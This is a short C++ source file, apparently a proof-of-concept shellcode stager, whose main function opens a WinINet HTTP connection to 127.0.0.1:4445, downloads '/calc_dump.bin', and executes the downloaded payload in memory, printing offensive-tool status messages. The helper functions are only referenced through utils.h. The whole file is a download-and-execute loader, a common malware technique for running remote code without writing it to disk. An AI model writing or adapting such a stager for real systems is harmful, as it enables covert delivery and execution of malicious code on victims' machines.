#include "utils.h"

/*
* App Entry Point
* TODO: Handle input arguments: Host/Port/Filename
*/
int main() {

	HINTERNET hSess = NULL;
	HINTERNET hConn = NULL;
	HINTERNET hReq = NULL;

	printf("[+] Initiating connection to Server\n");
	BOOL hRes = initHttpConn(L"127.0.0.1", 4445, L"GET", L"/calc_dump.bin", hSess, hConn, hReq);

	if (hRes) {

		printf("[+] Downloading Payload..\n");
		vector<char> buffer = downloadPayload(hReq);

		printf("[+] Trying to execute Payload in memory..\n");
		executePayload(buffer);

		printf("[+] Releasing Ressources..\n");
		releaseHandles(hSess, hConn, hReq);

		return 0;
	}
	else {
		printf("[!] Server connection error!\n");
		return -1;
	}
}